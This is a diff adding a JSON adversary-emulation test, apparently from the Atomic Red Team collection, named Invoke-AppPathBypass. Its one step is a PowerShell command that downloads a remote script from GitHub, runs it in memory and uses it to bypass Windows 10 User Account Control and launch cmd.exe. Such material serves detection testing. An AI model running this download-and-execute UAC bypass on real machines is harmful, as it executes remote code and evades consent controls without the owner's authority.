@@ -1,0 +1,23 @@
+{
+  "id": "06a220b6-7e29-4bd8-9d07-5b4d86742372",
+  "name": "Invoke-AppPathBypass",
+  "description": "Note: Windows 10 only. Upon execution windows backup and restore window will be opened.\n\nBypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "86a9df93-48d7-4447-be7d-f4ccffa93bae",
+      "type": "execute-command",
+      "data": {
+        "command": "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1059.001",
+    "atomic-red-team"
+  ]
+}
